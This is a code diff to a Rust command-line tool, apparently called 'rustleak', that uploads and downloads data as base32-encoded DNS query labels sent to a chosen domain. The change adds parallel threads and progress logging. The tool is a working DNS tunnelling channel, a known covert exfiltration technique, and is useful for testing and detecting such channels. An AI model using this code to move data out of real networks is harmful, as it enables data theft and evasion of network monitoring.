@@ -1,5 +1,5 @@
 use clap::{Parser, Subcommand};
-use futures::future::join_all;
+use futures::stream::{self, StreamExt};
 use std::fs;
 use log::{error, info};
 use simple_logger::SimpleLogger;
@@ -10,6 +10,8 @@ use rustleak_lib::{
 use std::time::Instant;
 use rand::distributions::{Distribution, WeightedIndex};
 use rand::thread_rng;
+use std::sync::{Arc, Mutex};
+use std::collections::HashSet;
 const MAX_ATTEMPTS: usize = 10;
 
 #[derive(Parser, Debug)]
@@ -29,6 +31,9 @@ struct CommonArgs {
     
     #[arg(short, long)]
     domain: String,
+
+    #[arg(short, long, default_value = "4")]
+    threads: usize,
 }
 
 #[derive(Subcommand, Debug)]
@@ -55,34 +60,61 @@ async fn main() {
                 let labels = split_data_into_label_chunks(&raw_bytes);
                 let encoded_labels = encode_base32(labels);
                 let total_labels = encoded_labels.len();
-            
+                
+                let processed_indices = Arc::new(Mutex::new(HashSet::new()));
                 let start_time = Instant::now();
-                let futures: Vec<_> = encoded_labels.iter().enumerate().map(|(i, label)| {
-                let resolver = resolver.clone();
-                let code = common_args.code.clone();
-                let domain = common_args.domain.clone();
-                async move {
-                    let mut attempts = 0;
-                    loop {
-                    tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
-                    let query = format!("UPLOAD.{}.{}.{}.{}.{}", label, i, total_labels, code, domain);
-            
-                    match resolver.lookup(&query, get_random_record_type()).await {
-                        Ok(_) => break,
-                        Err(_) => {
-                        attempts += 1;
-                        if attempts >= MAX_ATTEMPTS {
-                            error!("Failed to send query after {} attempts: {}", MAX_ATTEMPTS, query);
-                            error!("Aborting...");
-                            std::process::exit(1);
-                        }
-                        }
-                    }
-                    }
-                }
-                }).collect();
+                
+                stream::iter(0..total_labels)
+                    .map(|_| {
+                        let resolver = resolver.clone();
+                        let code = common_args.code.clone();
+                        let domain = common_args.domain.clone();
+                        let encoded_labels = encoded_labels.clone();
+                        let processed_indices = Arc::clone(&processed_indices);
 
-                join_all(futures).await;
+                        async move {
+                            let index = {
+                                let mut indices = processed_indices.lock().unwrap();
+                                let next_index = (0..total_labels)
+                                    .find(|&i| !indices.contains(&i));
+                                
+                                if let Some(i) = next_index {
+                                    indices.insert(i);
+                                    i
+                                } else {
+                                    return None;
+                                }
+                            };
+
+                            let label = &encoded_labels[index];
+                            let mut attempts = 0;
+                            
+                            loop {
+                                tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
+                                let query = format!("UPLOAD.{}.{}.{}.{}.{}", label, index, total_labels, code, domain);
+                        
+                                match resolver.lookup(&query, get_random_record_type()).await {
+                                    Ok(_) => {
+                                        info!("Successfully sent fragment {}/{}", index + 1, total_labels);
+                                        break;
+                                    },
+                                    Err(_) => {
+                                        attempts += 1;
+                                        if attempts >= MAX_ATTEMPTS {
+                                            error!("Failed to send query after {} attempts: {}", MAX_ATTEMPTS, query);
+                                            error!("Aborting...");
+                                            std::process::exit(1);
+                                        }
+                                    }
+                                }
+                            }
+                            Some(index)
+                        }
+                    })
+                    .buffer_unordered(common_args.threads)
+                    .filter_map(|x| async move { x })
+                    .collect::<Vec<_>>()
+                    .await;
 
                 let elapsed = start_time.elapsed().as_secs_f32();
                 let byte_rate = (raw_bytes.len() as f32) / elapsed;
@@ -123,46 +155,79 @@ async fn main() {
             };
 
             info!("Total fragments to download: {}", total_fragments);
+            info!("Using {} parallel threads", common_args.threads);
 
             let start_time = Instant::now();
-            let mut received_data: Vec<Option<String>> = vec![None; total_fragments];
-            for (seq, data) in received_data.iter_mut().enumerate().take(total_fragments) {
-                let mut attempts = 0;
-                while attempts < MAX_ATTEMPTS {
-                    let query = format!("DOWNLOAD.{}.{}.{}", common_args.code, seq, common_args.domain);
-                    tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
+            let received_data = Arc::new(Mutex::new(vec![None; total_fragments]));
+            let processed_indices = Arc::new(Mutex::new(HashSet::new()));
 
-                    match resolver.lookup(&query, hickory_resolver::proto::rr::RecordType::ANY).await {
-                        Ok(lookup) => {
-                            let records = lookup.iter().collect::<Vec<_>>();
-                            let record_data = records[0].to_string();
-                            *data = Some(record_data);
-                            break;
+            stream::iter(0..total_fragments)
+                .map(|_| {
+                    let resolver = resolver.clone();
+                    let code = common_args.code.clone();
+                    let domain = common_args.domain.clone();
+                    let received_data = Arc::clone(&received_data);
+                    let processed_indices = Arc::clone(&processed_indices);
+
+                    async move {
+                        let seq = {
+                            let mut indices = processed_indices.lock().unwrap();
+                            let next_seq = (0..total_fragments)
+                                .find(|&i| !indices.contains(&i));
+                            
+                            if let Some(i) = next_seq {
+                                indices.insert(i);
+                                i
+                            } else {
+                                return None;
+                            }
+                        };
+
+                        let mut attempts = 0;
+                        while attempts < MAX_ATTEMPTS {
+                            let query = format!("DOWNLOAD.{}.{}.{}", code, seq, domain);
+                            tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
+
+                            match resolver.lookup(&query, hickory_resolver::proto::rr::RecordType::ANY).await {
+                                Ok(lookup) => {
+                                    let records = lookup.iter().collect::<Vec<_>>();
+                                    let record_data = records[0].to_string();
+                                    let mut data = received_data.lock().unwrap();
+                                    data[seq] = Some(record_data);
+
+                                    let progress = (seq + 1) as f32 / total_fragments as f32 * 100.0;
+                                    let elapsed = start_time.elapsed().as_secs_f32();
+                                    let estimated_total = elapsed / ((seq + 1) as f32 / total_fragments as f32);
+                                    let remaining = estimated_total - elapsed;
+                                    info!(
+                                        "Progress: {:.1}% - Elapsed: {:.1}s - Remaining: {:.1}s",
+                                        progress, elapsed, remaining
+                                    );
+                                    return Some(seq);
+                                }
+                                Err(_) => {
+                                    attempts += 1;
+                                }
+                            }
                         }
-                        Err(_) => {
-                            attempts += 1;
-                        }
+                        error!("Failed to retrieve fragment after {} attempts: {}", MAX_ATTEMPTS, seq);
+                        error!("Aborting...");
+                        std::process::exit(1);
                     }
-                }
-
-                if attempts >= MAX_ATTEMPTS {
-                    error!("Failed to retrieve fragment after {} attempts: {}", MAX_ATTEMPTS, seq);
-                    error!("Aborting...");
-                    std::process::exit(1);
-                }
-
-                let progress = (seq + 1) as f32 / total_fragments as f32 * 100.0;
-                let elapsed = start_time.elapsed().as_secs_f32();
-                let estimated_total = elapsed / ((seq + 1) as f32 / total_fragments as f32);
-                let remaining = estimated_total - elapsed;
-                info!(
-                    "Progress: {:.1}% - Elapsed: {:.1}s - Remaining: {:.1}s",
-                    progress, elapsed, remaining
-                );
-            }
+                })
+                .buffer_unordered(common_args.threads)
+                .filter_map(|x| async move { x })
+                .collect::<Vec<_>>()
+                .await;
 
             let elapsed = start_time.elapsed().as_secs_f32();
-            let byte_rate = (total_fragments as f32 * 32.0) / elapsed; // Assuming each fragment is 32 bytes
+            let byte_rate = (total_fragments as f32 * 32.0) / elapsed;
+            
+            let received_data = Arc::try_unwrap(received_data)
+                .unwrap()
+                .into_inner()
+                .unwrap();
+            
             let decoded_data = decode_base32(
                 received_data.into_iter().flatten().collect(),
             );
